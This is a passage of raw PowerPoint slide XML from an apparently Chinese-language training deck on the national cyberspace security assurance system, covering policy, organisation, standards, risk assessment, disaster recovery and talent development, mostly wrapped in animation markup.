                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="54" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="57" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="8000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="58" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="59" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="60" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="61" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="62"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878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7989" y="1302728"/>
            <a:ext cx="8475785" cy="365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6194989"/>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9810"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6574" y="1434612"/>
            <a:ext cx="8009792" cy="3585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1720480"/>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0834"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2047" y="1302728"/>
            <a:ext cx="8420100" cy="3475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8821573"/>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185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3223" y="1302728"/>
            <a:ext cx="7955574" cy="3691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0222624"/>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288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1339" y="1368669"/>
            <a:ext cx="8024446" cy="332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187408"/>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2752943" y="2005141"/>
            <a:ext cx="3688299" cy="43204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a:t>网络空间安全法律法规与政策环境</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="矩形 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2726595" y="2956059"/>
            <a:ext cx="3674541" cy="43204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a:t>网络空间安全组织机构及管理体系</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2726595" y="3926589"/>
            <a:ext cx="3713911" cy="43204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a:t>网络空间安全技术与产业支撑平台</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2726595" y="4941168"/>
            <a:ext cx="3713911" cy="43204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a:t>网络空间安全基础设施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="下箭头 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4340085" y="2447902"/>
            <a:ext cx="382286" cy="553885"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6666FF"/>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11" name="下箭头 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4340085" y="3414473"/>
            <a:ext cx="382286" cy="553885"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6666FF"/>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12" name="下箭头 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4340085" y="4395966"/>
            <a:ext cx="382286" cy="553885"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6666FF"/>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13" name="矩形 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1675789" y="1700808"/>
            <a:ext cx="594320" cy="4032448"/>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dirty="0"/>
              <a:t>网络空间安全标准与规范</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="矩形 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6789424" y="1700808"/>
            <a:ext cx="594320" cy="41044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dirty="0"/>
              <a:t>网络空间安全人才培训教育体系</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="849346"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>我国网络空间安全保障体系</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14064660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47"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par>
                          <p:cTn id="20" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="1500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="21" presetID="47"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anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="11"/>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2" presetClass="entr" presetSubtype="4"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childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="31" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="2500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="32" presetID="47"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50"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="750" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="36" dur="750" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="12"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_y</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_y-.1"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_y"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="37" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="3250"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="38" presetID="2" presetClass="entr" presetSubtype="4" fill="hold" grpId="0" nodeType="after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00" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="47" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="48" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="49" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="50" presetID="53" presetClass="entr" presetSubtype="16"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80728"/>
            <a:ext cx="9144000" cy="5123234"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2703037671"/>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755649"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>我国网络空间安全保障体系</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="514350" y="1505529"/>
            <a:ext cx="8191500" cy="4011703"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建立健全国家网络空间安全组织与管理体制机制，加强网络空间安全工作的组织保障 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建立健全网络空间安全法律法规体系，推进网络空间安全法制建设 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建立完善网络空间安全标准体系，加强网络空间安全标准化工作 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建立网络空间安全技术体系，实现国家信息化发展的自主可控 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建设网络空间安全基础设施，提供国家网络空间安全保障能力支撑 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>建立网络空间安全人才培养体系，加快网络空间安全学科建设和网络空间安全人才培养</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37408016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02B57F5E-BB90-4246-BC79-F5793CDBCD60}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>103</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5123" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539751" y="1233487"/>
            <a:ext cx="8244718" cy="4931817"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全标准化</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解信息安全标准化的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全标准化工作的实践情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全应急处理与信息通报</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全应急处理与信息通报的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全应急处理与信息通报工作的实践情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全等级保护</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全等级保护的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全等级保护工作的实践情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全风险评估</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全风险评估的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全风险评估工作的实践情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：灾难恢复</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解灾难恢复的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国灾难恢复工作的实践情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：人才队伍建设</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解人才队伍建设的意义</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2300" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2300" dirty="0"/>
              <a:t>安全人才队伍建设工作的实践情况</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5124" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="352776" y="649534"/>
            <a:ext cx="8514648" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：我国网络空间安全保障工作主要内容</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6136052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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11"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anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15"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1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123">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="21" dur="5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12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123">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="512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123">
                                            <p:txEl>
